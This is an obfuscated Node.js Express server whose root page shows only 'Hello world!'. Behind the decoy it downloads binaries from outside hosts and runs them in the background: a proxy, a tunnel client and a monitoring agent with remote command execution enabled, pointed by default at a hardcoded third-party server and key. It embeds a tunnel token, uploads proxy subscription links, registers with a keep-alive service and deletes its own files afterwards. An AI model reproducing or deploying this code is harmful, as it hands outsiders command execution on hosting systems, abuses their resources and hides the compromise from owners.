const _0x5475bb=_0xa1d2;(function(_0x334779,_0x2eb310){const _0x42126e=_0xa1d2,_0x3d7b15=_0x334779();while(!![]){try{const _0x557344=-parseInt(_0x42126e(0x13b))/0x1*(-parseInt(_0x42126e(0xfb))/0x2)+-parseInt(_0x42126e(0xcf))/0x3*(-parseInt(_0x42126e(0x16f))/0x4)+-parseInt(_0x42126e(0x10b))/0x5+parseInt(_0x42126e(0x146))/0x6*(parseInt(_0x42126e(0x106))/0x7)+parseInt(_0x42126e(0x161))/0x8+-parseInt(_0x42126e(0xf1))/0x9*(-parseInt(_0x42126e(0x153))/0xa)+parseInt(_0x42126e(0x145))/0xb*(-parseInt(_0x42126e(0x184))/0xc);if(_0x557344===_0x2eb310)break;else _0x3d7b15['push'](_0x3d7b15['shift']());}catch(_0x590ba0){_0x3d7b15['push'](_0x3d7b15['shift']());}}}(_0x2c35,0x981a4));const express=require(_0x5475bb(0x186)),app=express(),axios=require(_0x5475bb(0x14b)),os=require('os'),fs=require('fs'),path=require(_0x5475bb(0x15e)),{promisify}=require(_0x5475bb(0x13f)),exec=promisify(require(_0x5475bb(0xe0))[_0x5475bb(0x12e)]),{execSync}=require(_0x5475bb(0xe0)),UPLOAD_URL=process[_0x5475bb(0x12a)][_0x5475bb(0x10d)]||'',PROJECT_URL=process[_0x5475bb(0x12a)]['PROJECT_URL']||'',AUTO_ACCESS=process['env'][_0x5475bb(0x14c)]||![],FILE_PATH=process['env'][_0x5475bb(0x16a)]||_0x5475bb(0x17f),SUB_PATH=process[_0x5475bb(0x12a)][_0x5475bb(0x13a)]||_0x5475bb(0xfd),PORT=process[_0x5475bb(0x12a)][_0x5475bb(0x165)]||process[_0x5475bb(0x12a)][_0x5475bb(0x154)]||0xbb8,UUID=process['env'][_0x5475bb(0x150)]||'564bfb54-aa76-4a41-9a53-e5cfa8d61fb8',NEZHA_SERVER=process['env'][_0x5475bb(0x155)]||_0x5475bb(0x15c),NEZHA_PORT=process[_0x5475bb(0x12a)]['NEZHA_PORT']||_0x5475bb(0xf4),NEZHA_KEY=process['env']['NEZHA_KEY']||_0x5475bb(0x136),ARGO_DOMAIN=process[_0x5475bb(0x12a)]['ARGO_DOMAIN']||_0x5475bb(0x127),ARGO_AUTH=process['env']['ARGO_AUTH']||_0x5475bb(0x181),ARGO_PORT=process['env'][_0x5475bb(0x16e)]||0x1f90,CFIP=process[_0x5475bb(0x12a)][_0x5475bb(0x122)]||'www.visa.com.sg',CFPORT=process[_0x5475bb(0x12a)][_0x5475bb(0xce)]||0x1bb,NAME=process[_0x5475bb(0x12a)][_0x5475bb(0xed)]||_0x5475bb(0x15f);!fs['existsSync'](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x5475bb(0x108)](FILE_PATH+_0x5475bb(0x149))):console[_0x5475bb(0x108)](FILE_PATH+_0x5475bb(0x11c));let npmPath=path['join'](FILE_PATH,_0x5475bb(0x14f)),phpPath=path['join'](FILE_PATH,_0x5475bb(0xec)),webPath=path[_0x5475bb(0x170)](FILE_PATH,_0x5475bb(0x188)),botPath=path[_0x5475bb(0x170)](FILE_PATH,_0x5475bb(0xf6)),subPath=path[_0x5475bb(0x170)](FILE_PATH,_0x5475bb(0x169)),listPath=path['join'](FILE_PATH,_0x5475bb(0x183)),bootLogPath=path[_0x5475bb(0x170)](FILE_PATH,_0x5475bb(0x173)),configPath=path[_0x5475bb(0x170)](FILE_PATH,_0x5475bb(0x125));function deleteNodes(){const _0x368f57=_0x5475bb;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x5d2314;try{_0x5d2314=fs[_0x368f57(0x135)](subPath,'utf-8');}catch{return null;}const _0x33b87e=Buffer[_0x368f57(0x129)](_0x5d2314,'base64')['toString'](_0x368f57(0x137)),_0x1d2d3a=_0x33b87e[_0x368f57(0x10c)]('\x0a')['filter'](_0xb2d3c2=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x368f57(0x141)](_0xb2d3c2));if(_0x1d2d3a[_0x368f57(0x110)]===0x0)return;return axios[_0x368f57(0x105)](UPLOAD_URL+_0x368f57(0x14a),JSON[_0x368f57(0x10f)]({'nodes':_0x1d2d3a}),{'headers':{'Content-Type':'application/json'}})['catch'](_0x5b2db0=>{return null;});}catch(_0x1f8f0a){return null;}}function cleanupOldFiles(){const _0x3f8742=_0x5475bb,_0xd27a4b=['web',_0x3f8742(0xf6),_0x3f8742(0x14f),'php',_0x3f8742(0x169),_0x3f8742(0x173)];_0xd27a4b[_0x3f8742(0x144)](_0x225f42=>{const _0x5883c2=_0x3f8742,_0x27cd7d=path[_0x5883c2(0x170)](FILE_PATH,_0x225f42);fs['unlink'](_0x27cd7d,()=>{});});}app[_0x5475bb(0x117)]('/',function(_0x3fc10c,_0x5850a9){const _0x177dcd=_0x5475bb;_0x5850a9[_0x177dcd(0x120)](_0x177dcd(0xd4));});const config={'log':{'access':_0x5475bb(0xe3),'error':_0x5475bb(0xe3),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x5475bb(0x15b),'settings':{'clients':[{'id':UUID,'flow':_0x5475bb(0xd3)}],'decryption':_0x5475bb(0xd7),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':_0x5475bb(0xf9),'dest':0xbbb},{'path':_0x5475bb(0x12d),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x5475bb(0x10e),'protocol':_0x5475bb(0x15b),'settings':{'clients':[{'id':UUID}],'decryption':_0x5475bb(0xd7)},'streamSettings':{'network':_0x5475bb(0x177),'security':_0x5475bb(0xd7)}},{'port':0xbba,'listen':_0x5475bb(0x10e),'protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x5475bb(0xd7)},'streamSettings':{'network':'ws','security':_0x5475bb(0xd7),'wsSettings':{'path':_0x5475bb(0x131)}},'sniffing':{'enabled':!![],'destOverride':[_0x5475bb(0x152),_0x5475bb(0x102),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x5475bb(0x10e),'protocol':_0x5475bb(0xe5),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x5475bb(0xf9)}},'sniffing':{'enabled':!![],'destOverride':[_0x5475bb(0x152),'tls',_0x5475bb(0x11e)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x5475bb(0x10e),'protocol':_0x5475bb(0xd1),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x5475bb(0xd7),'wsSettings':{'path':_0x5475bb(0x12d)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x5475bb(0x102),'quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x5475bb(0xdc)]},'outbounds':[{'protocol':_0x5475bb(0x13e),'tag':_0x5475bb(0xdb)},{'protocol':_0x5475bb(0xd9),'tag':_0x5475bb(0x138)}]};fs[_0x5475bb(0x100)](path[_0x5475bb(0x170)](FILE_PATH,_0x5475bb(0x125)),JSON[_0x5475bb(0x10f)](config,null,0x2));function getSystemArchitecture(){const _0x4acc2c=_0x5475bb,_0x78539d=os[_0x4acc2c(0xf8)]();return _0x78539d===_0x4acc2c(0xdf)||_0x78539d===_0x4acc2c(0xfe)||_0x78539d===_0x4acc2c(0xde)?_0x4acc2c(0xdf):_0x4acc2c(0xe8);}function downloadFile(_0x33be04,_0x5cfc00,_0x30f0b8){const _0x130320=_0x5475bb,_0x3249a7=path[_0x130320(0x170)](FILE_PATH,_0x33be04),_0x32b31c=fs[_0x130320(0x174)](_0x3249a7);axios({'method':_0x130320(0x117),'url':_0x5cfc00,'responseType':_0x130320(0x115)})[_0x130320(0x157)](_0x326c73=>{const _0x554e19=_0x130320;_0x326c73['data'][_0x554e19(0x114)](_0x32b31c),_0x32b31c['on']('finish',()=>{const _0x2cb096=_0x554e19;_0x32b31c['close'](),console[_0x2cb096(0x108)](_0x2cb096(0x107)+_0x33be04+'\x20successfully'),_0x30f0b8(null,_0x33be04);}),_0x32b31c['on']('error',_0x48d634=>{const _0x545373=_0x554e19;fs[_0x545373(0x113)](_0x3249a7,()=>{});const _0x570ee1=_0x545373(0x107)+_0x33be04+_0x545373(0x112)+_0x48d634[_0x545373(0x159)];console[_0x545373(0xfc)](_0x570ee1),_0x30f0b8(_0x570ee1);});})['catch'](_0xff4f19=>{const _0x1d440f=_0x130320,_0x23da96='Download\x20'+_0x33be04+_0x1d440f(0x112)+_0xff4f19[_0x1d440f(0x159)];console[_0x1d440f(0xfc)](_0x23da96),_0x30f0b8(_0x23da96);});}async function downloadFilesAndRun(){const _0x40f67e=_0x5475bb,_0x539b46=getSystemArchitecture(),_0xb81214=getFilesForArchitecture(_0x539b46);if(_0xb81214[_0x40f67e(0x110)]===0x0){console['log'](_0x40f67e(0x128));return;}const _0x2962a4=_0xb81214['map'](_0xebfaeb=>{return new Promise((_0x55451a,_0x70895f)=>{const _0x4a1623=_0xa1d2;downloadFile(_0xebfaeb[_0x4a1623(0x180)],_0xebfaeb[_0x4a1623(0xf0)],(_0x23a44b,_0x1c231c)=>{_0x23a44b?_0x70895f(_0x23a44b):_0x55451a(_0x1c231c);});});});try{await Promise[_0x40f67e(0xf7)](_0x2962a4);}catch(_0x5c4de9){console['error']('Error\x20downloading\x20files:',_0x5c4de9);return;}function _0x462062(_0xf0eb0e){const _0x447dbd=0x1fd;_0xf0eb0e['forEach'](_0x1e04ad=>{const _0x1024ec=_0xa1d2,_0x2459a9=path['join'](FILE_PATH,_0x1e04ad);fs[_0x1024ec(0x130)](_0x2459a9)&&fs[_0x1024ec(0x15a)](_0x2459a9,_0x447dbd,_0x44a546=>{const _0x3ed6b2=_0x1024ec;_0x44a546?console[_0x3ed6b2(0xfc)](_0x3ed6b2(0x116)+_0x2459a9+':\x20'+_0x44a546):console[_0x3ed6b2(0x108)]('Empowerment\x20success\x20for\x20'+_0x2459a9+':\x20'+_0x447dbd[_0x3ed6b2(0x17e)](0x8));});});}const _0x46aa5d=NEZHA_PORT?[_0x40f67e(0x121),_0x40f67e(0xeb),_0x40f67e(0xe1)]:[_0x40f67e(0x172),_0x40f67e(0xeb),_0x40f67e(0xe1)];_0x462062(_0x46aa5d);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x2080ba=NEZHA_SERVER[_0x40f67e(0xd6)](':')?NEZHA_SERVER[_0x40f67e(0x10c)](':')[_0x40f67e(0x17b)]():'',_0x27c853=new Set([_0x40f67e(0xf4),_0x40f67e(0xe6),_0x40f67e(0x148),_0x40f67e(0x185),_0x40f67e(0xff),_0x40f67e(0x12f)]),_0x32f09a=_0x27c853[_0x40f67e(0xdd)](_0x2080ba)?_0x40f67e(0x189):'false',_0x12bc98='\x0aclient_secret:\x20'+NEZHA_KEY+_0x40f67e(0xd8)+NEZHA_SERVER+_0x40f67e(0x118)+_0x32f09a+_0x40f67e(0x11f)+UUID;fs[_0x40f67e(0x100)](path[_0x40f67e(0x170)](FILE_PATH,_0x40f67e(0x147)),_0x12bc98);const _0x4c99db=_0x40f67e(0x140)+FILE_PATH+_0x40f67e(0xcd)+FILE_PATH+_0x40f67e(0x111);try{await exec(_0x4c99db),console[_0x40f67e(0x108)](_0x40f67e(0xe7)),await new Promise(_0x579d07=>setTimeout(_0x579d07,0x3e8));}catch(_0x447943){console[_0x40f67e(0xfc)](_0x40f67e(0x17c)+_0x447943);}}else{let _0x5f154d='';const _0x4dff2b=[_0x40f67e(0xf4),'8443',_0x40f67e(0x148),'2087','2083',_0x40f67e(0x12f)];_0x4dff2b['includes'](NEZHA_PORT)&&(_0x5f154d='--tls');const _0x5608b3='nohup\x20'+FILE_PATH+_0x40f67e(0x162)+NEZHA_SERVER+':'+NEZHA_PORT+_0x40f67e(0xe2)+NEZHA_KEY+'\x20'+_0x5f154d+'\x20>/dev/null\x202>&1\x20&';try{await exec(_0x5608b3),console[_0x40f67e(0x108)](_0x40f67e(0xda)),await new Promise(_0x3f4dc4=>setTimeout(_0x3f4dc4,0x3e8));}catch(_0x12508e){console[_0x40f67e(0xfc)](_0x40f67e(0x166)+_0x12508e);}}}else console['log'](_0x40f67e(0xe9));const _0x17aefc=_0x40f67e(0x140)+FILE_PATH+'/web\x20-c\x20'+FILE_PATH+_0x40f67e(0x12b);try{await exec(_0x17aefc),console[_0x40f67e(0x108)](_0x40f67e(0x175)),await new Promise(_0x462bb7=>setTimeout(_0x462bb7,0x3e8));}catch(_0x54fc7e){console[_0x40f67e(0xfc)](_0x40f67e(0x101)+_0x54fc7e);}if(fs['existsSync'](path[_0x40f67e(0x170)](FILE_PATH,_0x40f67e(0xf6)))){let _0x179ece;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x179ece='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x40f67e(0x11b)](/TunnelSecret/)?_0x179ece='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+'/tunnel.yml\x20run':_0x179ece=_0x40f67e(0x158)+FILE_PATH+_0x40f67e(0xe4)+ARGO_PORT;try{await exec(_0x40f67e(0x140)+FILE_PATH+_0x40f67e(0x126)+_0x179ece+_0x40f67e(0x134)),console[_0x40f67e(0x108)](_0x40f67e(0xd5)),await new Promise(_0xa3b8bf=>setTimeout(_0xa3b8bf,0x7d0));}catch(_0x4b1e6a){console[_0x40f67e(0xfc)]('Error\x20executing\x20command:\x20'+_0x4b1e6a);}}await new Promise(_0x23a9cc=>setTimeout(_0x23a9cc,0x1388));}function _0x2c35(){const _0x3d9fb9=['unshift','quic','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','send','./npm','CFIP','set','unlinkSync','config.json','/bot\x20','galaxyc.yszy.nyc.mn','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','from','env','/config.json\x20>/dev/null\x202>&1\x20&','TunnelSecret','/trojan-argo','exec','2053','existsSync','/vless-argo','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','tunnel.yml','\x20>/dev/null\x202>&1\x20&','readFileSync','Np4E8x6sszn0X8JFNi','utf-8','block','?security=tls&sni=','SUB_PATH','1027646dfPtbt','Error\x20reading\x20boot.log:','\x0a\x20\x20\x20\x20','freedom','util','nohup\x20','test','/sub.txt\x20saved\x20successfully','https://arm64.ssss.nyc.mn/v1','forEach','2101OtpoiA','4932222aAXAcl','config.yaml','2096','\x20is\x20created','/api/delete-nodes','axios','AUTO_ACCESS','Error\x20executing\x20command:\x20','?encryption=none&security=tls&sni=','npm','UUID','application/json','http','6426550hyWPVO','PORT','NEZHA_SERVER','&type=ws&host=','then','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','message','chmod','vless','nzku.fortymenty.eu.org','https://amd64.ssss.nyc.mn/v1','path','Vls','text/plain;\x20charset=utf-8','9912680yPvgDS','/npm\x20-s\x20','base64','\x0a\x20\x20\x0atrojan://','SERVER_PORT','npm\x20running\x20error:\x20','response','/vmess-argo?ed=2560','sub.txt','FILE_PATH','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','https://amd64.ssss.nyc.mn/web','Skipping\x20adding\x20automatic\x20access\x20task','ARGO_PORT','4158148zyRNUp','join','https://oooo.serv00.net/add-url','./php','boot.log','createWriteStream','web\x20is\x20running','/api/add-subscriptions','tcp','clear','status','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','pop','php\x20running\x20error:\x20','/api/add-nodes','toString','./tmp','fileName','eyJhIjoiZjUxNzk5OTMxMWQ4ZTAzOTg4OThmZjRkMTZiZDYzYjQiLCJ0IjoiMzgxZDlhMjctY2Y4MS00MDM2LWFiMGQtODkxZmJmNWY0NWFkIiwicyI6IlkyWXhaR0U0WkdZdE5EbGpOQzAwTlRZNUxUaG1Namd0T1dGbU1XSm1ORFptTkdNMSJ9','ARGO_DOMAIN:','list.txt','194172PldYRd','2087','express','ArgoDomain:','web','true','automatic\x20access\x20task\x20added\x20successfully','http\x20server\x20is\x20running\x20on\x20port:','/php\x20-c\x20\x22','CFPORT','3IuQUwt','https://amd64.ssss.nyc.mn/2go','trojan','pkill\x20-f\x20\x22[b]ot\x22\x20>\x20/dev/null\x202>&1','xtls-rprx-vision','Hello\x20world!','bot\x20is\x20running','includes','none','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x201\x0aserver:\x20','blackhole','npm\x20is\x20running','direct','https+local://8.8.8.8/dns-query','has','aarch64','arm','child_process','./bot','\x20-p\x20','/dev/null','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','vmess','8443','php\x20is\x20running','amd','NEZHA\x20variable\x20is\x20empty,skip\x20running','push','./web','php','NAME','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','\x20>/dev/null\x202>&1','fileUrl','9oXqwIs','rm\x20-rf\x20','https://amd64.ssss.nyc.mn/agent','443','\x0a\x20\x20credentials-file:\x20','bot','all','arch','/vmess-argo','Subscription\x20uploaded\x20successfully','2VQOFDo','error','sub','arm64','2083','writeFileSync','web\x20running\x20error:\x20','tls','tunnel.json','\x0a\x20\x20\x0avmess://','post','7wHJxFH','Download\x20','log','https://arm64.ssss.nyc.mn/web','\x0a\x20\x20tunnel:\x20','5286885qIhWRs','split','UPLOAD_URL','127.0.0.1','stringify','length','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','\x20failed:\x20','unlink','pipe','stream','Empowerment\x20failed\x20for\x20','get','\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20','添加URL失败:\x20','curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','match','\x20already\x20exists'];_0x2c35=function(){return _0x3d9fb9;};return _0x2c35();}function getFilesForArchitecture(_0x4fb4b2){const _0x41d1c1=_0x5475bb;let _0x533a78;_0x4fb4b2===_0x41d1c1(0xdf)?_0x533a78=[{'fileName':_0x41d1c1(0x188),'fileUrl':_0x41d1c1(0x109)},{'fileName':'bot','fileUrl':'https://arm64.ssss.nyc.mn/2go'}]:_0x533a78=[{'fileName':_0x41d1c1(0x188),'fileUrl':_0x41d1c1(0x16c)},{'fileName':'bot','fileUrl':_0x41d1c1(0xd0)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x22b90d=_0x4fb4b2===_0x41d1c1(0xdf)?'https://arm64.ssss.nyc.mn/agent':_0x41d1c1(0xf3);_0x533a78[_0x41d1c1(0x11d)]({'fileName':_0x41d1c1(0x14f),'fileUrl':_0x22b90d});}else{const _0x39b226=_0x4fb4b2===_0x41d1c1(0xdf)?_0x41d1c1(0x143):_0x41d1c1(0x15d);_0x533a78[_0x41d1c1(0x11d)]({'fileName':'php','fileUrl':_0x39b226});}}return _0x533a78;}function argoType(){const _0x4e26e3=_0x5475bb;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x4e26e3(0x108)](_0x4e26e3(0xee));return;}if(ARGO_AUTH[_0x4e26e3(0xd6)](_0x4e26e3(0x12c))){fs[_0x4e26e3(0x100)](path[_0x4e26e3(0x170)](FILE_PATH,_0x4e26e3(0x103)),ARGO_AUTH);const _0x3a44f2=_0x4e26e3(0x10a)+ARGO_AUTH[_0x4e26e3(0x10c)]('\x22')[0xb]+_0x4e26e3(0xf5)+path['join'](FILE_PATH,'tunnel.json')+_0x4e26e3(0x132)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x4e26e3(0x16b);fs[_0x4e26e3(0x100)](path[_0x4e26e3(0x170)](FILE_PATH,_0x4e26e3(0x133)),_0x3a44f2);}else console[_0x4e26e3(0x108)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}argoType();async function extractDomains(){const _0x3bad58=_0x5475bb;let _0x39f5a8;if(ARGO_AUTH&&ARGO_DOMAIN)_0x39f5a8=ARGO_DOMAIN,console[_0x3bad58(0x108)](_0x3bad58(0x182),_0x39f5a8),await _0x36e30f(_0x39f5a8);else try{const _0x597089=fs[_0x3bad58(0x135)](path[_0x3bad58(0x170)](FILE_PATH,'boot.log'),_0x3bad58(0x137)),_0x34a749=_0x597089[_0x3bad58(0x10c)]('\x0a'),_0x54968e=[];_0x34a749['forEach'](_0x5138bf=>{const _0x3d4e3b=_0x3bad58,_0x452bb4=_0x5138bf[_0x3d4e3b(0x11b)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x452bb4){const _0x2e6e78=_0x452bb4[0x1];_0x54968e[_0x3d4e3b(0xea)](_0x2e6e78);}});if(_0x54968e['length']>0x0)_0x39f5a8=_0x54968e[0x0],console[_0x3bad58(0x108)](_0x3bad58(0x187),_0x39f5a8),await _0x36e30f(_0x39f5a8);else{console['log'](_0x3bad58(0x17a)),fs[_0x3bad58(0x124)](path[_0x3bad58(0x170)](FILE_PATH,'boot.log'));async function _0x3e787a(){const _0x3ff582=_0x3bad58;try{await exec(_0x3ff582(0xd2));}catch(_0x2de54a){}}_0x3e787a(),await new Promise(_0x7fd68b=>setTimeout(_0x7fd68b,0xbb8));const _0xaede91='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x3bad58(0xe4)+ARGO_PORT;try{await exec('nohup\x20'+path[_0x3bad58(0x170)](FILE_PATH,'bot')+'\x20'+_0xaede91+_0x3bad58(0x134)),console['log']('bot\x20is\x20running.'),await new Promise(_0x1d02bc=>setTimeout(_0x1d02bc,0xbb8)),await extractDomains();}catch(_0x3199a6){console['error'](_0x3bad58(0x14d)+_0x3199a6);}}}catch(_0x5e0e2e){console['error'](_0x3bad58(0x13c),_0x5e0e2e);}async function _0x36e30f(_0x48fe1f){const _0x196110=_0x3bad58,_0x1a92bc=execSync(_0x196110(0x11a),{'encoding':'utf-8'}),_0x37fd11=_0x1a92bc['trim']();return new Promise(_0x329a9d=>{setTimeout(()=>{const _0x2c390f=_0xa1d2,_0x3f4ef8={'v':'2','ps':NAME+'-'+_0x37fd11,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x2c390f(0xd7),'net':'ws','type':_0x2c390f(0xd7),'host':_0x48fe1f,'path':_0x2c390f(0x168),'tls':_0x2c390f(0x102),'sni':_0x48fe1f,'alpn':''},_0x2ea06c='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x2c390f(0x14e)+_0x48fe1f+_0x2c390f(0x156)+_0x48fe1f+'&path=%2Fvless-argo%3Fed%3D2560#'+NAME+'-'+_0x37fd11+_0x2c390f(0x104)+Buffer[_0x2c390f(0x129)](JSON['stringify'](_0x3f4ef8))['toString'](_0x2c390f(0x163))+_0x2c390f(0x164)+UUID+'@'+CFIP+':'+CFPORT+_0x2c390f(0x139)+_0x48fe1f+_0x2c390f(0x156)+_0x48fe1f+'&path=%2Ftrojan-argo%3Fed%3D2560#'+NAME+'-'+_0x37fd11+_0x2c390f(0x13d);console['log'](Buffer[_0x2c390f(0x129)](_0x2ea06c)[_0x2c390f(0x17e)](_0x2c390f(0x163))),fs[_0x2c390f(0x100)](subPath,Buffer[_0x2c390f(0x129)](_0x2ea06c)[_0x2c390f(0x17e)]('base64')),console['log'](FILE_PATH+_0x2c390f(0x142)),uplodNodes(),app[_0x2c390f(0x117)]('/'+SUB_PATH,(_0x866d63,_0x7342f6)=>{const _0x535e1a=_0x2c390f,_0x315f6f=Buffer[_0x535e1a(0x129)](_0x2ea06c)['toString'](_0x535e1a(0x163));_0x7342f6[_0x535e1a(0x123)]('Content-Type',_0x535e1a(0x160)),_0x7342f6[_0x535e1a(0x120)](_0x315f6f);}),_0x329a9d(_0x2ea06c);},0x7d0);});}}async function uplodNodes(){const _0x1ba8b6=_0x5475bb;if(UPLOAD_URL&&PROJECT_URL){const _0x22aac2=PROJECT_URL+'/'+SUB_PATH,_0xc09e00={'subscription':[_0x22aac2]};try{const _0x309665=await axios[_0x1ba8b6(0x105)](UPLOAD_URL+_0x1ba8b6(0x176),_0xc09e00,{'headers':{'Content-Type':_0x1ba8b6(0x151)}});if(_0x309665[_0x1ba8b6(0x179)]===0xc8)console['log']('Subscription\x20uploaded\x20successfully');else return null;}catch(_0xad2242){if(_0xad2242['response']){if(_0xad2242[_0x1ba8b6(0x167)][_0x1ba8b6(0x179)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x1ba8b6(0x130)](listPath))return;const _0x487a01=fs[_0x1ba8b6(0x135)](listPath,'utf-8'),_0x1c4f71=_0x487a01[_0x1ba8b6(0x10c)]('\x0a')['filter'](_0x2ee2ba=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x2ee2ba));if(_0x1c4f71[_0x1ba8b6(0x110)]===0x0)return;const _0x207517=JSON[_0x1ba8b6(0x10f)]({'nodes':_0x1c4f71});try{await axios[_0x1ba8b6(0x105)](UPLOAD_URL+_0x1ba8b6(0x17d),_0x207517,{'headers':{'Content-Type':_0x1ba8b6(0x151)}});if(response['status']===0xc8)console[_0x1ba8b6(0x108)](_0x1ba8b6(0xfa));else return null;}catch(_0x37359f){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x5eb9c1=_0xa1d2,_0x45e3c3=[bootLogPath,configPath,webPath,botPath,phpPath,npmPath];if(NEZHA_PORT)_0x45e3c3['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x45e3c3['push'](phpPath);exec(_0x5eb9c1(0xf2)+_0x45e3c3['join']('\x20')+_0x5eb9c1(0xef),_0x587164=>{const _0x1aade1=_0x5eb9c1;console[_0x1aade1(0x178)](),console[_0x1aade1(0x108)]('App\x20is\x20running'),console[_0x1aade1(0x108)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}function _0xa1d2(_0x2cfd42,_0x326b93){const _0x2c3585=_0x2c35();return _0xa1d2=function(_0xa1d26,_0x4c6329){_0xa1d26=_0xa1d26-0xcc;let _0x14e533=_0x2c3585[_0xa1d26];return _0x14e533;},_0xa1d2(_0x2cfd42,_0x326b93);}cleanFiles();async function AddVisitTask(){const _0x53094b=_0x5475bb;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x53094b(0x108)](_0x53094b(0x16d));return;}try{const _0x3e94d5=await axios['post'](_0x53094b(0x171),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x53094b(0x151)}});console[_0x53094b(0x108)](_0x53094b(0x18a));}catch(_0x25f20c){console[_0x53094b(0xfc)](_0x53094b(0x119)+_0x25f20c['message']);}}async function startserver(){deleteNodes(),cleanupOldFiles(),await downloadFilesAndRun(),await extractDomains(),AddVisitTask();}startserver(),app['listen'](PORT,()=>console[_0x5475bb(0x108)](_0x5475bb(0xcc)+PORT+'!'));
